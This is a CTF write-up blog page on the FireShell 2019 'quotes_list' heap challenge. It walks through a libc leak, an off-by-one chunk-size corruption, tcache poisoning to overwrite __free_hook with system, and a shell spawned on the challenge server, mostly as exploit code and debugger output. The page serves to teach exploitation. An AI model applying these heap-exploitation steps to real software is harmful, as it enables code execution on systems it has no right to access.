<!doctype html>

<html lang="en-us">

<head>
  <title>Catousify</title>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="The HTML5 Herald" />
  <meta name="author" content="kiror0" /><meta name="generator" content="Hugo 0.62.0" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.0/normalize.min.css" />
  <script src="https://kit.fontawesome.com/b76b73e8e8.js" crossorigin="anonymous"></script>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
  <link rel="stylesheet" type="text/css" href="http://kiror0.github.io/ctf/css/styles.css" /></head>

<body>
  <div id="container">
    <header>
      <h1>
                <a href="http://kiror0.github.io/ctf/">Catousify</a>
            </h1>

      <ul id="social-media">
        
        
          
        <li><a href="https://github.com/kiror0"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a></li>
           
      </ul>
      
      <p><em>No Clever Tagline Needed.</em></p>
      
    </header>

    
<nav>
    <ul>
        
        <li>
            <a class="" href="http://kiror0.github.io/ctf/posts/">
                <i class="fa-li fa  fa-lg"></i><span>Posts</span>
            </a>
        </li>
        
        <li>
            <a class="" href="http://kiror0.github.io/ctf/about/">
                <i class="fa-li fa  fa-lg"></i><span>About Me</span>
            </a>
        </li>
        
    </ul>
</nav>

    <main>




<article>

    <h1>FireShell 2019 - quotes_list</h1>

    
        <aside>
    <ul>
        <li>
            <time class="post-date" datetime="2019-01-28T06:54:42Z">Jan 28, 2019</time>
        </li>
        
        <li>
            Categories:
            <em>
                
                    
                    <a href="http://kiror0.github.io/ctf/categories/pwn">pwn</a>
                
                    , 
                    <a href="http://kiror0.github.io/ctf/categories/writeup">writeup</a>
                
            </em>
        </li>
        

        

        <li>3 minutes read</li>
    </ul>
</aside>

    

    <h2 id="downloads">downloads</h2>
<ul>
<li><a href="http://kiror0.github.io/ctf/assets/fireshell/quotes_list/quotes_list.zip">binary</a></li>
<li><a href="http://kiror0.github.io/ctf/assets/fireshell/quotes_list/libc.so.6">libc.so.6</a></li>
<li><a href="http://kiror0.github.io/ctf/assets/fireshell/quotes_list/ld-linux-x86-64.so.2">ld-linux-x86-64.so.2</a></li>
<li><a href="http://kiror0.github.io/ctf/assets/fireshell/quotes_list/solve.py">solve.py</a></li>
</ul>
<h2 id="prep">prep</h2>
<p>You'll need to patch elf binary to make it run correctly. Using <code>patchelf</code>,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">patchelf --set-interpreter <span style="color:#e6db74">`</span>pwd<span style="color:#e6db74">`</span>/ld-linux-x86-64.so.2
patchelf --set-rpath <span style="color:#e6db74">`</span>pwd<span style="color:#e6db74">`</span>
</code></pre></div><h2 id="summary">summary</h2>
<ol>
<li>Usual heap exploitation challenge layout, you have <code>create</code>, <code>edit</code>, <code>show</code>, and <code>delete</code>.</li>
<li>No UAF, pointer set to zero after chunk gets freed. <em>or is it(?)</em></li>
<li>Arbritrary off-by-one write in <code>edit</code>.</li>
<li>for unknown <em>reason(?)</em>, <code>show</code> uses <code>strncpy</code> to a buffer in stack initialized with <code>alloca(16 * ((chunk_size + 15) / 16 ))</code> then print it.</li>
</ol>
<h2 id="exploit">exploit</h2>
<p>A brief helper function,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(length, content):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, length<span style="color:#f92672">.</span>__str__())
    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, content)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(index, content):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, index<span style="color:#f92672">.</span>__str__())
    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, content)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(index):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">3</span><span style="color:#e6db74">&#39;</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, index<span style="color:#f92672">.</span>__str__())
    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>)
    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">-----</span><span style="color:#e6db74">&#39;</span>, drop<span style="color:#f92672">=</span>True)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(index):
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">4</span><span style="color:#e6db74">&#39;</span>)
    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, index<span style="color:#f92672">.</span>__str__())
</code></pre></div><h3 id="leak-libc">leak libc</h3>
<p>The binary uses libc v2.28 which enables <code>tcache</code>, a simple trick to leak libc is to allocate a huge chunk that big enough to surpass <code>smallbins</code> and <code>free</code> it, for some reasons allocating smallbins then free, it will only get your chunk back to tcache free list and we don't want that. Code speak louder than words,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">create(<span style="color:#ae81ff">0x1000</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># _huge_ chunk</span>
create(<span style="color:#ae81ff">0x18</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># will be used later</span>
create(<span style="color:#ae81ff">0x18</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># will be used later</span>
create(<span style="color:#ae81ff">0x18</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">3</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># will be used later</span>

<span style="color:#75715e"># pwndbg&gt; dq $piebase+0x202040</span>
<span style="color:#75715e"># 0000555555756040     000055555575c250 000055555575d270</span>
<span style="color:#75715e"># 0000555555756050     000055555575d290 000055555575d2b0</span>
<span style="color:#75715e"># 0000555555756060     0000000000000000 0000000000000000</span>
<span style="color:#75715e"># 0000555555756070     0000001800001000 0000001800000018</span>

delete(<span style="color:#ae81ff">0</span>)

<span style="color:#75715e"># pwndbg&gt; dq $piebase+0x202040</span>
<span style="color:#75715e"># 0000555555756040     0000000000000000 000055555575d270</span>
<span style="color:#75715e"># 0000555555756050     000055555575d290 000055555575d2b0</span>
<span style="color:#75715e"># 0000555555756060     0000000000000000 0000000000000000</span>
<span style="color:#75715e"># 0000555555756070     00000018ffffffff 0000001800000018</span>

<span style="color:#75715e"># pwndbg&gt; dq 0x000055555575c250</span>
<span style="color:#75715e"># 000055555575c250     0000000000000000 0000000000001011</span>
<span style="color:#75715e"># 000055555575c260     0000155555327ca0 0000155555327ca0</span>
<span style="color:#75715e">#                       ^-- fd populated</span>

<span style="color:#75715e"># pwndbg&gt; x/gx 0x0000155555327ca0</span>
<span style="color:#75715e"># 0x155555327ca0 &lt;main_arena+96&gt;: 0x000055555575d2c0</span>

create(<span style="color:#ae81ff">0x18</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0</span><span style="color:#e6db74">&#39;</span>)

<span style="color:#75715e"># pwndbg&gt; dq 0x000055555575c250</span>
<span style="color:#75715e"># 000055555575c250     0000000000000000 0000000000000021</span>
<span style="color:#75715e"># 000055555575c260     0000155555328230 00001555553282c0</span>
<span style="color:#75715e"># 000055555575c270     000055555575c250 0000000000000ff1</span>
<span style="color:#75715e"># 000055555575c280     0000155555327ca0 0000155555327ca0</span>

<span style="color:#75715e"># pwndbg&gt; unsortedbin</span>
<span style="color:#75715e"># unsortedbin</span>
<span style="color:#75715e"># all: 0x55555575c270 —▸ 0x155555327ca0 (main_arena+96) ◂— 0x55555575c270</span>

libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(show(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x3af230</span>
</code></pre></div><h3 id="off-by-one-write">off-by-one write</h3>
<p>after allocate memory with <code>create</code>, you can <code>edit</code> the buf with exactly one byte larger than actual size. This could lead to corrupt the chunk metadata.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># pwndbg&gt; dq 0x000055555575d260 50</span>
<span style="color:#75715e"># 000055555575d260     0000000000000ff0 0000000000000020</span>
<span style="color:#75715e"># 000055555575d270     0000000000000031 0000000000000000</span>
<span style="color:#75715e"># 000055555575d280     0000000000000000 0000000000000021</span>
<span style="color:#75715e"># 000055555575d290     0000000000000032 0000000000000000</span>
<span style="color:#75715e"># 000055555575d2a0     0000000000000000 0000000000000021</span>
<span style="color:#75715e"># 000055555575d2b0     0000000000000033 0000000000000000</span>
<span style="color:#75715e"># 000055555575d2c0     0000000000000000 000000000001fd41</span>

edit(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x71</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># overlap</span>

<span style="color:#75715e"># pwndbg&gt; dq 0x000055555575d260 50</span>
<span style="color:#75715e"># 000055555575d260     0000000000000ff0 0000000000000020</span>
<span style="color:#75715e"># 000055555575d270     0000000000000000 0000000000000000</span>
<span style="color:#75715e"># 000055555575d280     0000000000000000 0000000000000071</span>
<span style="color:#75715e">#                                         ^-- corrupted</span>
<span style="color:#75715e"># 000055555575d290     0000000000000032 0000000000000000</span>
<span style="color:#75715e"># 000055555575d2a0     0000000000000000 0000000000000021</span>
<span style="color:#75715e"># 000055555575d2b0     0000000000000033 0000000000000000</span>
<span style="color:#75715e"># 000055555575d2c0     0000000000000000 000000000001fd41</span>
</code></pre></div><p>after corrupting metadata size, we could trick <code>free</code> to put this chunk in a larger chunk (0x70) tcache free list.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">delete(<span style="color:#ae81ff">2</span>)

<span style="color:#75715e"># pwndbg&gt; dq 0x000055555575d260 50</span>
<span style="color:#75715e"># 000055555575d260     0000000000000ff0 0000000000000020</span>
<span style="color:#75715e"># 000055555575d270     0000000000000000 0000000000000000</span>
<span style="color:#75715e"># 000055555575d280     0000000000000000 0000000000000071</span>
<span style="color:#75715e"># 000055555575d290     0000000000000000 000055555575c010</span>
<span style="color:#75715e"># 000055555575d2a0     0000000000000000 0000000000000021</span>

<span style="color:#75715e"># pwndbg&gt; tcachebins</span>
<span style="color:#75715e"># tcachebins</span>
<span style="color:#75715e"># 0x70 [  1]: 0x55555575d290 ◂— 0x0 &lt;--- !!!!</span>
</code></pre></div><p>By malloc first-fit behaviour, <code>malloc</code> with size <code>(0x68)</code> will return the freed chunk before where the actual chunk size should be <code>(0x18)</code>. Thus, we could achieve complete takeover for the next chunk.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">create(<span style="color:#ae81ff">0x68</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)

<span style="color:#75715e"># pwndbg&gt; dq 0x000055555575d260 50</span>
<span style="color:#75715e"># 000055555575d260     0000000000000ff0 0000000000000020</span>
<span style="color:#75715e"># 000055555575d270     0000000000000000 0000000000000000</span>
<span style="color:#75715e"># 000055555575d280     0000000000000000 0000000000000071</span>
<span style="color:#75715e"># 000055555575d290     0000000000000032 0000000000000000</span>
<span style="color:#75715e"># 000055555575d2a0     0000000000000000 0000000000000021</span>
</code></pre></div><p>After that, it's just a simple poke around in <code>tcache-poison</code>ing, overwrite <code>__free_hook</code> to <code>system</code>, and trigger <code>free</code> to call <code>system</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">delete(<span style="color:#ae81ff">3</span>)
edit(<span style="color:#ae81ff">2</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__free_hook</span><span style="color:#e6db74">&#39;</span>]))

<span style="color:#75715e"># pwndbg&gt; tcachebins</span>
<span style="color:#75715e"># tcachebins</span>
<span style="color:#75715e"># 0x20 [  1]: 0x55555575d2b0 —▸ 0x1555553298c8 (__free_hook) ◂— 0x0</span>

create(<span style="color:#ae81ff">0x18</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># 3</span>
create(<span style="color:#ae81ff">0x18</span>, p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>])) <span style="color:#75715e"># 4</span>

delete(<span style="color:#ae81ff">3</span>) <span style="color:#75715e"># trigger free(&#39;/bin/sh&#39;) -&gt; system(&#39;/bin/sh&#39;)</span>
</code></pre></div><h2 id="flag">flag</h2>
<pre><code>[+] Opening connection to 35.243.188.20 on port 2005: Done
[*] Switching to interactive mode
Timeout!
$ ls
flag.txt
quotes_list
quotes_list.sh
$ cat flag.txt
F#{th3r3_ar3_s0m3_n3ws_c0mm1ng_1nt0_libc-2.29}$
[*] Interrupted
[*] Closed connection to 35.243.188.20 port 2005
</code></pre>

</article>


<section class="post-nav">
    <ul>
        
        <li>
            <a href="http://kiror0.github.io/ctf/posts/fireshell-2019-babyheap/"><i class="fa fa-chevron-circle-left"></i> FireShell 2019 - babyheap</a>
        </li>
        
        
        <li>
            <a href="http://kiror0.github.io/ctf/posts/def-con-quals-2019-speedrun-12/">DEF CON Quals 2019 - Speedrun 12 <i class="fa fa-chevron-circle-right"></i> </a>
        </li>
        
    </ul>
</section>
    





</main>
    <footer>
        <h6>Copyright © 2019 - kiror0 |
            Rendered by <a href="https://gohugo.io" title="Hugo">Hugo</a> |
            <a href="http://kiror0.github.io/ctf/index.xml">Subscribe</a></h6>
    </footer>
</div>
<script src="http://kiror0.github.io/ctf/js/scripts.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-146594173-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>


</body>

</html>
